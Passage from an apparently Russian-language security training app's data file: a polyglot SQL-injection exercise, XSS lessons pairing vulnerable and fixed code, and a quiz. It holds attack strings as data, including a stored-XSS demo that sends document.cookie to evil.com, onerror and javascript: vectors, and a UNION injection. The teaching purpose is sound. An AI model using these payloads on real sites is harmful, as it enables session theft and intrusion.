    description: 'Создайте пейлоад, работающий в MySQL, PostgreSQL и SQLite одновременно.',
    initialQuery: `SELECT * FROM users\nWHERE username = '[ВВОД]'`,
    hint: 'Polyglot-пейлоад должен использовать синтаксис, валидный во всех СУБД. Используйте: -- для комментариев (работает везде), UNION SELECT, 0x для hex.',
    exampleInput: "1' UNION SELECT NULL,NULL,NULL-- -",
    explanation:
      'Polyglot SQLi — пейлоад, работающий в нескольких СУБД. Ключевые принципы: 1) Двойной дефис с пробелом (-- ) — стандартный SQL-комментарий. 2) UNION SELECT NULL — NULL работает во всех СУБД. 3) Одинарная кавычка — стандартный разделитель строк. 4) Точное количество NULL определяется числом столбцов оригинального запроса.',
    successQuery: `SELECT * FROM users\nWHERE username = '1' UNION SELECT NULL,NULL,NULL-- -`,
  },
];

// ============================================================
// XSS Types
// ============================================================
export const xssTypes = [
  {
    id: 'reflected',
    title: 'Отражённый XSS (Reflected XSS)',
    description:
      'Отражённый XSS возникает, когда вредоносный скрипт встраивается в ответ сервера как результат запроса, содержащего внедрённый код. Скрипт «отражается» от сервера к пользователю через URL-параметры, формы или заголовки.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Ввод пользователя вставляется напрямую без санитизации
  document.getElementById('search-result').innerHTML =
    new URLSearchParams(location.search).get('q');
  // Атака: ?q=<script>alert('XSS')</script>
  // Или: ?q=<img src=x onerror=alert('XSS')>
</script>`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div>
  Результаты поиска для:
  <span id="search-result"></span>
</div>

<script>
  // Используем textContent вместо innerHTML
  const query = new URLSearchParams(location.search).get('q');
  document.getElementById('search-result').textContent = query;

  // Или с серверной санитизацией (Node.js)
  const escapeHTML = (str) => str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#039;');
</script>`,
    attackDemo: '<script>alert("XSS-атака выполнена!")</script>',
    mitigation: 'Используйте textContent вместо innerHTML, кодируйте спецсимволы, применяйте Content Security Policy (CSP).',
  },
  {
    id: 'stored',
    title: 'Хранимый XSS (Stored XSS)',
    description:
      'Хранимый XSS — наиболее опасный тип, при котором вредоносный скрипт сохраняется на сервере (в базе данных, логах, комментариях) и выполняется при каждом отображении страницы. В отличие от отражённого XSS, жертве не нужно переходить по специальной ссылке — достаточно просто открыть страницу.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД —评论区 -->
<div class="comments">
  <!-- Комментарии из базы данных -->
  <div class="comment">
    <strong>Пользователь</strong>
    <p>{{comment.text}}</p>
    <!-- Если в comment.text содержится:
         <script>stealCookies()</script>
         Он будет выполнен для КАЖДОГО посетителя!
    -->
  </div>
</div>

<!-- Express.js backend -->
app.post('/api/comments', (req, res) => {
  // Сохраняем комментарий без санитизации
  db.query('INSERT INTO comments (text) VALUES (?)',
    [req.body.text]);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -->
<div class="comments">
  <div class="comment">
    <strong>Пользователь</strong>
    <!-- Используем HTML-кодирование -->
    <p>{{escapeHTML(comment.text)}}</p>
  </div>
</div>

<!-- Backend с санитизацией -->
const DOMPurify = require('dompurify');
app.post('/api/comments', (req, res) => {
  // Санитизируем HTML перед сохранением
  const cleanText = DOMPurify.sanitize(req.body.text, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong'],
    ALLOWED_ATTR: []
  });
  db.query('INSERT INTO comments (text) VALUES (?)', [cleanText]);
});`,
    attackDemo: '<script>document.location="https://evil.com/steal?cookie="+document.cookie</script>',
    mitigation: 'Санитизируйте ввод перед сохранением в БД. Используйте DOMPurify для очистки HTML. Применяйте CSP заголовки.',
  },
  {
    id: 'dom',
    title: 'DOM-based XSS',
    description:
      'DOM-based XSS возникает, когда уязвимость находится в клиентском JavaScript-коде, который модифицирует DOM-дерево на основе данных из ненадёжного источника. В отличие от отражённого и хранимого XSS, вредоносный код вообще не отправляется на сервер — вся атака происходит в браузере.',
    vulnerableCode: `// УЯЗВИМЫЙ КОД — на стороне клиента
// Чтение данных из location.hash (фрагмента URL)
const userInput = location.hash.substring(1);

// Опасно — вставка HTML через innerHTML
document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + userInput + '!';

// Атака: #<img src=x onerror=alert('XSS')>
// Результат: <div id="welcome">
//   Добро пожаловать, <img src=x onerror=alert('XSS')>!
// </div>

// Другие опасные источники:
// - document.referrer
// - document.cookie
// - window.name
// - localStorage/sessionStorage
// - postMessage`,
    secureCode: `// БЕЗОПАСНЫЙ КОД
const userInput = location.hash.substring(1);

// Вариант 1: Использовать textContent
document.getElementById('welcome').textContent =
  'Добро пожаловать, ' + userInput + '!';

// Вариант 2: Кодирование спецсимволов
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

document.getElementById('welcome').innerHTML =
  'Добро пожаловать, ' + escapeHTML(userInput) + '!';

// Вариант 3: Использовать URI-кодирование
const safeInput = decodeURIComponent(userInput);
// Всегда валидируйте входные данные!`,
    attackDemo: '#<img src=x onerror="document.body.style.background=\'red\'">',
    mitigation: 'Используйте textContent, а не innerHTML. Кодируйте данные из location.hash, document.referrer и других клиентских источников.',
  },
  {
    id: 'svg',
    title: 'SVG XSS',
    description:
      'XSS через SVG-файлы — внедрение JavaScript в SVG-изображения. SVG поддерживает JavaScript, что позволяет злоумышленникам внедрять скрипты в «изображения», загружаемые на сайт.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — загрузка SVG без проверки -->
<img src="/uploads/user-avatar.svg" alt="Avatar">

<!-- Содержимое malicious.svg: -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
  <!-- Или через обработчик событий: -->
  <svg onload="alert(document.cookie)">
  <!-- Или через animate: -->
  <animate onbegin="alert(1)" attributeName="x" />
</svg>

<!-- Сервер принимает SVG без проверки: -->
app.post('/upload', (req, res) => {
  // Проверяет только Content-Type: image/svg+xml
  // Но не проверяет содержимое на script/handler
  fs.writeFile(req.file.path, req.file.buffer);
});`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — использовать img с CSP -->
<!-- Заголовок CSP блокирует inline-скрипты в SVG: -->
<!-- Content-Security-Policy: script-src 'self' -->

<!-- Или конвертировать SVG в PNG на сервере: -->
const sharp = require('sharp');
app.post('/upload', async (req, res) => {
  if (req.file.mimetype === 'image/svg+xml') {
    // Конвертируем в PNG — JavaScript теряется
    await sharp(req.file.buffer)
      .png()
      .toFile(\`uploads/\${req.file.filename}.png\`);
  }
});

<!-- Или использовать object с sandbox: -->
<object data="safe.svg" type="image/svg+xml"
        sandbox="allow-same-origin">
</object>`,
    attackDemo: '<svg onload="alert(document.cookie)"><circle cx="50" cy="50" r="40"/></svg>',
    mitigation: 'Конвертируйте SVG в PNG на сервере. Используйте CSP для блокировки inline-скриптов. Санитизируйте SVG через DOMPurify с удалением <script> и обработчиков событий.',
  },
  {
    id: 'markdown',
    title: 'Markdown XSS',
    description:
      'XSS через Markdown-рендеринг — многие парсеры Markdown позволяют HTML-разметку внутри текста, что может быть использовано для внедрения скриптов.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД — Markdown с HTML -->
<!-- Пользовательский ввод: -->
<!-- [Click here](javascript:alert('XSS')) -->
<!-- Или: <img src=x onerror=alert('XSS')> -->

const md = require('markdown-it')();
const html = md.render(userInput);
document.getElementById('content').innerHTML = html;

<!-- markdown-it по умолчанию разрешает HTML -->
<!-- React с marked: -->
import marked from 'marked';
function Comment({ text }) {
  return <div dangerouslySetInnerHTML={{
    __html: marked(text)  // HTML не санитизирован!
  }} />;
}`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД — санитизация Markdown -->
import DOMPurify from 'dompurify';
import marked from 'marked';

function Comment({ text }) {
  const rawHtml = marked(text);
  const cleanHtml = DOMPurify.sanitize(rawHtml, {
    ALLOWED_TAGS: ['p', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'blockquote'],
    ALLOWED_ATTR: ['href', 'title'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick'],
    FORBID_TAGS: ['script', 'iframe', 'object', 'embed', 'form']
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}

<!-- Или отключить HTML в markdown-it: -->
const md = require('markdown-it')({ html: false });`,
    attackDemo: '[Click here](javascript:alert(document.cookie))\n\n<img src=x onerror=alert("XSS")>',
    mitigation: 'Отключите HTML в Markdown-парсере (html: false). Используйте DOMPurify для санитизации результата. Запретите javascript: URL-схемы.',
  },
  {
    id: 'pdf',
    title: 'PDF XSS',
    description:
      'XSS через PDF-файлы — встроенный PDF-просмотрщик браузера может выполнять JavaScript из PDF-документов через Embedded Files и JavaScript API PDF.',
    vulnerableCode: `<!-- УЯЗВИМЫЙ КОД -- PDF с JavaScript -->
<!-- PDF может содержать: -->
<!-- this.disclosedDoc = true; -->
<!-- app.alert("XSS"); -->
<!-- -->

<!-- Сервер разрешает загрузку PDF: -->
app.post('/upload-pdf', (req, res) => {
  // Проверяет только расширение .pdf
  // Но не проверяет содержимое на JavaScript
  if (req.file.originalname.endsWith('.pdf')) {
    fs.writeFile(req.file.path, req.file.buffer);
  }
});

<!-- Пользователь открывает PDF в браузере: -->
<embed src="/uploads/report.pdf" type="application/pdf">
<!-- PDF.js или встроенный просмотрщик может выполнить JS -->`,
    secureCode: `<!-- БЕЗОПАСНЫЙ КОД -- санитизация PDF -->
const { PDFDocument } = require('pdf-lib');

app.post('/upload-pdf', async (req, res) => {
  const pdf = await PDFDocument.load(req.file.buffer);
  // Удаляем все JavaScript из PDF
  pdf.setJavaScript([]);
  pdf.setJavaScriptForAction([]);
  // Удаляем встроенные файлы
  pdf.removeEmbeddedFiles();
  const cleanBuffer = await pdf.save();
  fs.writeFile(req.file.path, cleanBuffer);
});

<!-- Или конвертировать в изображения: -->
<!-- Использовать pdf2pic или similar -->
<embed src="/uploads/report.pdf#toolbar=0&navpanes=0" type="application/pdf">`,
    attackDemo: 'PDF с встроенным JavaScript: this.disclosedDoc = true; app.alert("XSS");',
    mitigation: 'Удаляйте JavaScript из PDF на сервере (pdf-lib). Конвертируйте PDF в изображения. Используйте песочницу для просмотра. Устанавливайте Content-Disposition: attachment.',
  },
];

// ============================================================
// Quiz Questions
// ============================================================
export interface QuizQuestion {
  id: string;
  category: string;
  difficulty: 'easy' | 'medium' | 'hard';
  question: string;
  options: string[];
  correctIndex: number;
  explanation: string;
}

export const quizQuestions: QuizQuestion[] = [
  // SQL Injection
  {
    id: 'sql-1',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Какой метод лучше всего защищает от SQL-инъекций?',
    options: [
      'Фильтрация спецсимволов на клиенте',
      'Параметризованные запросы (prepared statements)',
      'Использование HTTPS',
      'Скрытие названий таблиц',
    ],
    correctIndex: 1,
    explanation:
      'Параметризованные запросы разделяют SQL-код и данные, что полностью исключает возможность инъекции. Данные передаются как параметры и не могут изменить структуру запроса, даже если содержат SQL-команды.',
  },
  {
    id: 'sql-2',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Что делает ввод "\\\' OR \\\'1\\\'=\\\'1" в форме логина?',
    options: [
      'Создаёт нового пользователя',
      'Заставляет условие WHERE быть всегда истинным',
      'Удаляет таблицу пользователей',
      'Блокирует доступ к базе данных',
    ],
    correctIndex: 1,
    explanation:
      'Эта строка закрывает кавычку username и добавляет OR \\\'1\\\'=\\\'1\\\'. Поскольку 1=1 всегда истинно, запрос возвращает все строки таблицы пользователей, что позволяет войти без знания реального пароля.',
  },
  {
    id: 'sql-3',
    category: 'SQL-инъекции',
    difficulty: 'easy',
    question: 'Для чего используется SQL-комментарий (-- ) при атаке?',
    options: [
      'Для ускорения выполнения запроса',
      'Для комментирования оставшейся части SQL-запроса',
      'Для обхода фаервола',
      'Для шифрования запроса',
    ],
    correctIndex: 1,
    explanation:
      'SQL-комментарий (-- ) превращает всё после него в комментарий. Это позволяет злоумышленнику «обрезать» ненужную часть запроса (например, проверку пароля), оставляя только нужное условие.',
  },
  {
    id: 'sql-4',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Какой оператор позволяет объединить результаты двух SELECT-запросов?',
    options: ['JOIN', 'UNION', 'MERGE', 'COMBINE'],
    correctIndex: 1,
    explanation:
      'UNION объединяет результаты двух или более SELECT-запросов в один набор. При SQL-инъекции злоумышленник может использовать UNION SELECT для извлечения данных из других таблиц.',
  },
  {
    id: 'sql-5',
    category: 'SQL-инъекции',
    difficulty: 'medium',
    question: 'Что такое «слепая» SQL-инъекция (Blind SQL Injection)?',
    options: [
      'Инъекция без использования SQL-комментариев',
      'Атака, при которой сервер не возвращает данные напрямую, а отвечает «да/нет»',
      'Инъекция через аудиоканал',
      'Атака на мобильные приложения',
    ],
    correctIndex: 1,
    explanation:
      'При слепой SQL-инъекции сервер не отображает результаты запроса, но злоумышленник может делать логические выводы по поведению приложения (оно показывает разные страницы при истинных и ложных условиях). Это позволяет постепенно извлекать данные посимвольно.',
  },
  // XSS
  {
    id: 'xss-1',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'В чём главное отличие DOM-based XSS от отражённого?',
    options: [
      'DOM XSS работает только в Chrome',
      'При DOM XSS вредоносный код вообще не отправляется на сервер',
      'Отражённый XSS более опасный',
      'DOM XSS требует HTTPS',
    ],
    correctIndex: 1,
    explanation:
      'DOM-based XSS полностью выполняется на стороне клиента. Вредоносный код содержится в URL-фрагменте, location.hash или другом клиентском источнике и модифицирует DOM напрямую через JavaScript, вообще не взаимодействуя с сервером.',
  },
  {
    id: 'xss-2',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'Какое свойство JavaScript безопаснее для вставки текста?',
    options: ['innerHTML', 'outerHTML', 'textContent', 'document.write'],
    correctIndex: 2,
    explanation:
      'textContent вставляет только текст, автоматически кодируя спецсимволы. HTML-теги не интерпретируются как разметка, что предотвращает XSS-атаки. innerHTML и document.write интерпретируют HTML, что делает их опасными.',
  },
  {
    id: 'xss-3',
    category: 'XSS-атаки',
    difficulty: 'easy',
    question: 'Что делает HTTP-заголовок Content Security Policy (CSP)?',
    options: [
      'Шифрует содержимое страницы',
      'Ограничивает источники, откуда можно загружать скрипты и ресурсы',
      'Ускоряет загрузку страницы',
      'Включает сжатие данных',
    ],
    correctIndex: 1,
    explanation:
      'CSP позволяет указать допустимые источники для скриптов, стилей, изображений и других ресурсов. Например, Content-Security-Policy: script-src \\\'self\\\' запрещает загрузку скриптов из любых источников, кроме текущего домена, что блокирует большинство XSS-атак.',
  },
  {
    id: 'xss-4',
    category: 'XSS-атаки',
    difficulty: 'medium',
    question: 'Какой тип XSS наиболее опасный?',
    options: ['Отражённый', 'DOM-based', 'Хранимый (Stored)', 'Все одинаково опасны'],
    correctIndex: 2,
    explanation:
      'Хранимый XSS наиболее опасен, потому что вредоносный код сохраняется на сервере и выполняется для каждого пользователя, открывающего страницу. Злоумышленнику достаточно один раз внедрить скрипт, и он будет работать постоянно.',
  },
  {
    id: 'xss-5',
    category: 'XSS-атаки',
    difficulty: 'medium',
    question: 'Какой атрибут HTML-тега чаще всего используется для XSS-атак?',
    options: ['style', 'class', 'onerror / onload / onclick', 'href'],
    correctIndex: 2,
    explanation:
      'Обработчики событий (onerror, onload, onclick и др.) позволяют выполнить JavaScript при определённых событиях. Например, <img src=x onerror=alert(1)> выполнит alert при ошибке загрузки изображения. Атрибут style может использоваться для CSS-инъекций, но менее опасен.',
  },
  // CSRF
  {
    id: 'csrf-1',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Что такое CSRF-атака?',
    options: [
      'Кража паролей через поддельный сайт',
      'Выполнение нежелательных действий от имени аутентифицированного пользователя',
      'Перехват сетевого трафика',
      'DDoS-атака на сервер',
    ],
    correctIndex: 1,
    explanation:
      'CSRF (Cross-Site Request Forgery) — это атака, при которой злоумышленник заставляет браузер жертвы отправить HTTP-запрос к уязвимому сайту. Поскольку браузер автоматически прикрепляет куки аутентификации, сервер воспринимает запрос как легитимный.',
  },
  {
    id: 'csrf-2',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Какой механизм наиболее эффективен для защиты от CSRF?',
    options: [
      'Использование HTTPS',
      'CSRF-токены (anti-CSRF tokens)',
      'Сложные пароли',
      'Rate Limiting',
    ],
    correctIndex: 1,
    explanation:
      'CSRF-токены — это уникальные случайные значения, сервер генерирует их для каждой сессии или формы. При отправке запроса токен должен быть включён, и сервер проверяет его валидность. Злоумышленник не может получить токен из-за политики одного источника (Same-Origin Policy).',
  },
  {
    id: 'csrf-3',
    category: 'CSRF',
    difficulty: 'easy',
    question: 'Какое значение cookie-атрибута SameSite обеспечивает лучшую защиту?',
    options: ['None', 'Lax', 'Strict', 'Off'],
    correctIndex: 2,
    explanation:
      'SameSite=Strict запрещает отправку куки с любыми кросс-сайтовыми запросами. SameSite=Lax разрешает куки для навигации (GET-запросов по ссылке), но блокирует для POST-запросов из форм. None не ограничивает отправку и требует Secure-атрибут.',
  },
  {
    id: 'csrf-4',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Почему браузер автоматически отправляет куки при CSRF-атаке?',
    options: [
      'Из-за бага в браузере',
      'Это стандартное поведение HTTP-куки',
      'Злоумышленник заставляет его это делать',
      'Только в старых браузерах',
    ],
    correctIndex: 1,
    explanation:
      'По спецификации HTTP, браузер автоматически прикрепляет куки к запросам к домену, для которого они установлены. Это фундаментальное поведение куки. Злоумышленник создаёт страницу, которая отправляет запрос к целевому сайту, и браузер автоматически включает куки аутентификации.',
  },
  {
    id: 'csrf-5',
    category: 'CSRF',
    difficulty: 'medium',
    question: 'Почему AJAX-запросы с CORS не защищают от CSRF по умолчанию?',
    options: [
      'CORS блокирует все кросс-доменные запросы',
      'Формы HTML не подчиняются CORS — они могут отправлять POST без preflight',
      'AJAX-запросы не используют куки',
      'CORS нужен только для WebSocket',
    ],
    correctIndex: 1,
    explanation:
      'HTML-формы (<form>) могут отправлять POST-запросы к любому домену без проверки CORS. CORS (и preflight-запросы) применяется только к определённым типам AJAX-запросов. Поэтому CSRF-атака через скрытую HTML-форму полностью обходит CORS.',
  },
  // Auth
  {
    id: 'auth-1',
    category: 'Аутентификация',
    difficulty: 'easy',
    question: 'Какой алгоритм рекомендуется для хеширования паролей?',
    options: ['MD5', 'SHA-256', 'bcrypt', 'Base64'],
    correctIndex: 2,
    explanation:
      'bcrypt специально разработан для хеширования паролей. Он включает соль (salt) для защиты от rainbow-таблиц и настраиваемый фактор сложности (cost), который замедляет перебор. MD5 устарел и уязвим, SHA-256 слишком быстрый, Base64 — это кодировка, не хеширование.',
  },
  {
    id: 'auth-2',
    category: 'Аутентификация',
    difficulty: 'easy',
    question: 'Что такое «соль» (salt) при хешировании паролей?',
    options: [
      'Зашифрованный пароль',
      'Случайные данные, добавляемые к паролю перед хешированием',
      'Ключ для расшифровки хеша',
      'Второй фактор аутентификации',
    ],
    correctIndex: 1,
    explanation:
      'Соль — это случайное значение, уникальное для каждого пользователя, которое добавляется к паролю перед хешированием. Это предотвращает использование заранее вычисленных таблиц (rainbow tables) и обеспечивает, что одинаковые пароли имеют разные хеши.',
  },
  {
    id: 'auth-3',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Какой принцип безопасности нарушается, если сервер возвращает разные сообщения для «пользователь не найден» и «неправильный пароль»?',
    options: [
      'Принцип наименьших привилегий',
      'Защита от перебора (brute-force protection)',
      'Защита от перечисления пользователей (user enumeration)',
      'Разделение обязанностей',
    ],
    correctIndex: 2,
    explanation:
      'Разные сообщения позволяют злоумышленнику определить, существует ли аккаунт с указанным email. Злоумышленник может перебирать email-адреса и собирать список пользователей для последующих атак. Правильный подход — единое сообщение: «Неверные учётные данные».',
  },
  {
    id: 'auth-4',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Что такое JWT (JSON Web Token)?',
    options: [
      'Способ шифрования данных',
      'Токен для хранения пароля в браузере',
      'Подписанный/зашифрованный набор данных для передачи информации между сторонами',
      'База данных пользователей',
    ],
    correctIndex: 2,
    explanation:
      'JWT — это компактный, URL-безопасный токен, состоящий из трёх частей: Header (заголовок с алгоритмом), Payload (полезные данные, такие как id и роль пользователя) и Signature (подпись, обеспечивающая целостность). Он используется для аутентификации и авторизации без хранения состояния на сервере.',
  },
  {
    id: 'auth-5',
    category: 'Аутентификация',
    difficulty: 'hard',
    question: 'Сколько символов должен содержать надёжный пароль?',
    options: [
      'Минимум 6 символов',
      'Минимум 8 символов',
      'Минимум 12 символов',
      'Минимум 4 символа',
    ],
    correctIndex: 2,
    explanation:
      'Современные рекомендации NIST и других организаций предполагают минимум 12 символов для пароля. Длина является критически важным фактором безопасности — каждый дополнительный символ экспоненциально увеличивает время перебора. Пароль из 12+ символов с разными типами символов обеспечивает надёжную защиту.',
  },
  {
    id: 'auth-6',
    category: 'Аутентификация',
    difficulty: 'hard',
    question: 'Что такое атака через перехват кода авторизации OAuth (Authorization Code Interception)?',
    options: [
      'Злоумышленник перехватывает код авторизации между браузером и сервером',
      'Использование вредоносного OAuth-приложения с неправильно настроенным redirect_uri',
      'Взлом сервера авторизации',
      'Подделка JWT-токена',
    ],
    correctIndex: 1,
    explanation:
      'При Authorization Code Interception злоумышленник регистрирует вредоносное приложение или использует открытый редирект для перехвата кода авторизации. Если redirect_uri не валидируется строго, код может быть перенаправлен на сервер злоумышленника. Защита: PKCE (Proof Key for Code Exchange), строгая валидация redirect_uri, использование state-параметра.',
  },
  {
    id: 'auth-7',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Что такое атака «фиксация сессии» (Session Fixation)?',
    options: [
      'Злоумышленник крадёт существующую сессию',
      'Злоумышленник устанавливает ID сессии жертвы, а затем использует его после аутентификации',
      'Сервер генерирует предсказуемые ID сессий',
      'Куки сессии передаются по HTTP',
    ],
    correctIndex: 1,
    explanation:
      'Session Fixation: злоумышленник отправляет жертве ссылку с известным session ID (?sessionid=attacker123). После входа жертвы этот session ID становится аутентифицированным. Злоумышленник использует тот же ID для доступа. Защита: регенерация session ID после логина (session.regenerateId()), привязка сессии к IP/User-Agent.',
  },
  {
    id: 'auth-8',
    category: 'Аутентификация',
    difficulty: 'easy',
    question: 'Что такое Credential Stuffing (перебор учётных данных)?',
    options: [
      'Подбор пароля через брутфорс',
      'Автоматизированная попытка входа с использованием ранее утеклих логинов и паролей на других сайтах',
      'Кража куки сессии',
      'Фишинговая атака для получения паролей',
    ],
    correctIndex: 1,
    explanation:
      'Credential Stuffing использует тот факт, что люди повторно используют пароли. Злоумышленник берёт утечку из одного сервиса (миллионы логинов/паролей) и автоматически проверяет их на других сайтах. Защита: обязательная 2FA, мониторинг утечек паролей (Have I Been Pwned API), rate limiting, CAPTCHA, проверка по IP-репутации.',
  },
  {
    id: 'auth-9',
    category: 'Аутентификация',
    difficulty: 'hard',
    question: 'Какая уязвимость связана с токенами сброса пароля?',
    options: [
      'Токены передаются по email',
      'Токен не инвалидируется после использования или основан на предсказуемых данных',
      'Токены слишком длинные',
      'Токены хранятся в базе данных',
    ],
    correctIndex: 1,
    explanation:
      'Токены сброса пароля часто уязвимы: основаны на MD5(email + timestamp), не имеют срока действия, не инвалидируются после смены пароля, или отправляются по email (который может быть скомпрометирован). Защита: криптографически случайный токен (min 32 bytes), срок действия 1 час, однократное использование, инвалидация при смене email/пароля.',
  },
  {
    id: 'auth-10',
    category: 'Аутентификация',
    difficulty: 'medium',
    question: 'Что такое MFA Fatigue (Push Fatigue) атака?',
    options: [
      'Атака на аппаратный токен',
      'Многократная отправка push-уведомлений пользователю, пока он случайно не подтвердит вход',
      'Перехват SMS-кодов',
      'Блокировка MFA-сервера',
    ],
    correctIndex: 1,
    explanation:
      'MFA Fatigue (Push Bombing): злоумышленник с логином и паролем жертвы многократно инициирует вход, отправляя push-уведомления на устройство жертвы. Устав от уведомлений, пользователь может случайно нажать «Approve». Пример: атака на Uber (2022). Защита: number matching (ввести число из push), ограничение частоты push-запросов, FIDO2/WebAuthn вместо push.',
  },
  // General
  {
    id: 'general-1',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое OWASP?',
    options: [
      'Программный продукт для защиты серверов',
      'Международная организация по безопасности приложений',
      'Тип атаки на веб-приложения',
      'Язык программирования',
    ],
    correctIndex: 1,
    explanation:
      'OWASP (Open Worldwide Application Security Project) — это некоммерческая организация, которая занимается улучшением безопасности программного обеспечения. Её самым известным проектом является OWASP Top 10 — список десяти наиболее критических угроз безопасности веб-приложений.',
  },
  {
    id: 'general-2',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое Principle of Least Privilege (Принцип наименьших привилегий)?',
    options: [
      'Каждый пользователь должен иметь права администратора',
      'Каждому процессу и пользователю предоставляются минимально необходимые права',
      'Только администратор может получать доступ к данным',
      'Все пользователи равны в правах',
    ],
    correctIndex: 1,
    explanation:
      'Принцип наименьших привилегий означает, что каждому пользователю, процессу и системе должны предоставляться только те права, которые необходимы для выполнения их задач. Это ограничивает потенциальный ущерб при компрометации аккаунта или уязвимости.',
  },
  {
    id: 'general-3',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое HTTP-заголовок X-Frame-Options?',
    options: [
      'Определяет размер кадра изображения',
      'Предотвращает кликджекинг (clickjacking) — встраивание сайта в iframe',
      'Включает фреймворк JavaScript',
      'Настройка анимации',
    ],
    correctIndex: 1,
    explanation:
      'X-Frame-Options указывает браузеру, можно ли встраивать страницу в <frame> или <iframe>. Значение DENY полностью запрещает встраивание, SAMEORIGIN разрешает только с того же домена. Это защита от кликджекинга — атаки, при которой невидимый iframe с целевым сайтом накладывается на видимые элементы.',
  },
  {
    id: 'general-4',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что такое SSRF (Server-Side Request Forgery)?',
    options: [
      'Кража данных с сервера через forged request',
      'Когда сервер делает запросы к внутренним ресурсам по указанию злоумышленника',
      'Атака на DNS-сервер',
      'Подмена IP-адреса',
    ],
    correctIndex: 1,
    explanation:
      'SSRF позволяет злоумышленнику заставить серверное приложение делать HTTP-запросы к указанным URL. Это может быть использовано для доступа к внутренним ресурсам, облачным метаданным (например, AWS 169.254.169.254) или для сканирования внутренней сети.',
  },
  {
    id: 'general-5',
    category: 'Общая безопасность',
    difficulty: 'easy',
    question: 'Что означает акроним HTTPS?',
    options: [
      'HyperText Transfer Protocol Secure',
      'High Tech Transfer Protocol System',
      'HyperText Transfer Protocol Server',
      'HyperText Transfer Protocol Standard',
    ],
    correctIndex: 0,
    explanation:
      'HTTPS (HyperText Transfer Protocol Secure) — это расширение протокола HTTP, использующее шифрование TLS/SSL для защиты передаваемых данных. Это обеспечивает конфиденциальность (данные нельзя прочитать), целостность (данные нельзя изменить) и аутентификацию (сервер — это тот, за кого он себя выдаёт).',
  },
  // --- Additional General Security Questions ---
  {
    id: 'general-6',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Defense in Depth» (Глубокая защита)?',
    options: [
      'Использование одного мощного средства защиты',
      'Многослойная стратегия безопасности с несколькими уровнями защиты',
      'Шифрование данных на нескольких уровнях OSI',
      'Многофакторная аутентификация',
    ],
    correctIndex: 1,
    explanation:
      'Defense in Depth — это стратегия, при которой используются несколько уровней защиты (фаерволы, IDS/IPS, шифрование, контроль доступа, мониторинг). Если один уровень будет преодолён, остальные продолжат защищать систему.',
  },
  {
    id: 'general-7',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Какой HTTP-заголовок запрещает браузеру отображать страницу в iframe?',
    options: [
      'X-Content-Type-Options',
      'X-Frame-Options: DENY',
      'Strict-Transport-Security',
      'X-XSS-Protection',
    ],
    correctIndex: 1,
    explanation:
      'X-Frame-Options: DENY полностью запрещает браузеру отображать страницу в iframe, frame или object. Это предотвращает кликджекинг-атаки. Альтернатива — CSP-директива frame-ancestors.',
  },
  {
    id: 'general-8',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Zero Day» (0-day) уязвимость?',
    options: [
      'Уязвимость, которая была обнаружена и исправлена',
      'Уязвимость, о которой разработчики ещё не знают и для которой нет патча',
      'Уязвимость, существующая менее одного дня',
      'Уязвимость только в мобильных приложениях',
    ],
    correctIndex: 1,
    explanation:
      'Zero Day — уязвимость, о которой разработчик ещё не знает (или не выпустил патч). Злоумышленники могут эксплуатировать её до того, как будет выпущено исправление. Название происходит от количества дней, прошедших с момента обнаружения.',
  },
  {
    id: 'general-9',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что делает HTTP-заголовок Strict-Transport-Security (HSTS)?',
    options: [
      'Запрещает загрузку скриптов с других доменов',
      'Заставляет браузер использовать только HTTPS для данного домена',
      'Отключает кэширование страницы',
      'Включает двухфакторную аутентификацию',
    ],
    correctIndex: 1,
    explanation:
      'HSTS (HTTP Strict Transport Security) указывает браузеру всегда использовать HTTPS для данного домена, даже если пользователь вводит http://. Это предотвращает downgrade-атаки и перехват сессии через незашифрованное соединение.',
  },
  {
    id: 'general-10',
    category: 'Общая безопасность',
    difficulty: 'medium',
    question: 'Что такое «Security by Design»?',
    options: [
      'Добавление безопасности после разработки',
      'Интеграция вопросов безопасности на каждом этапе разработки (SDLC)',
      'Использование только платных инструментов защиты',
      'Тестирование безопасности перед релизом',
    ],
    correctIndex: 1,
    explanation:
      'Security by Design — подход, при котором безопасность встроена в процесс разработки с самого начала (требования, проектирование, кодирование, тестирование, деплой). Это дешевле и эффективнее, чем добавление безопасности после завершения разработки.',
  },
  // --- Additional SQL Injection Questions ---
  {
